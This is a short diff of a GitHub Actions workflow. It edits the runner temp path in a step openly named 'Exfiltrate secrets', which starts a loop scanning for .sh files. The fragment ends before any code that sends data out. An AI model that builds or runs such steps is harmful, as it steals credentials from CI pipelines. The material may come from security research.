@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Exfiltrate secrets
         run: |
-          DIR="/home/ubuntu/actions-runner/_work/_temp/"
+          DIR="/home/docker/actions-runner/_work/_temp/"
           files_found=false
           while true; do
             # Check for .sh files in the directory
